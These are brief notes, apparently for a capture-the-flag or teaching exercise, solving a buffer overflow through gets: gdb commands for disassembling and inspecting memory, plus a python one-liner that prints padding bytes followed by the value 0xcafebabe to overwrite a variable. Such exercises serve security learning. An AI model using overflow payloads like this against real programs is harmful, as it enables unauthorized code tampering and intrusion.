gdb commands for solution:
* break gets
* disas func
* disas main
* x $register+offset

To print bytes as input:
python -c "print '\x01'*offset+'\xbe\xba\xfe\xca'"
